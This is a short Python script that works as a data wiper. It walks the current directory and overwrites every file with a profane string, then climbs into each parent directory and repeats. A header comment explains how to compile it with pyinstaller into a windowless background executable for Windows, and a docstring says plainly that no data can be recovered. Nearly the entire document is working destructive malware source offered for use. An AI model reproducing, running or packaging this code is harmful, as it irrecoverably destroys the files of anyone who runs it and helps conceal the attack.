#!/usr/bin/env python3
import os
'''
to run this scripts in windows OS in the background , do the following: 
1- install python & add it to the path
2- install pyinstaller to convert .py to .exe
	pip install pyinstaller
3- open cmd and type : 
	pyinstaller -w -F <path to python scripts>

	-w : make the script run in the background.
	-F combile every relative file in .exe file.
'''

def corrupt():
	'''
		corrupt data in the working dir,by opening every file in binary mode
		and typing FUCK YOU on it,
		Result : file corrupted , no data to recover.
		use it under you responsiblity.
	'''
	for rootdir, dirname, files in os.walk(os.getcwd()):	# walk through every directories
		for file in files:	# files is a list of files in rootdir
			try:
				# corrupt data
				with open(os.path.join(rootdir, file), "wb") as f:
					f.write("Fuck You".encode())
			except:
				pass


if __name__ == '__main__':
	bol = True	# boolean value to get out of while loop

	while bol:
		corrupt()
		try:
			# move to parent directory and do the same thing 
			# if there is any remaining file
			os.chdir("../")
			bol = True
		except :
			bol = False
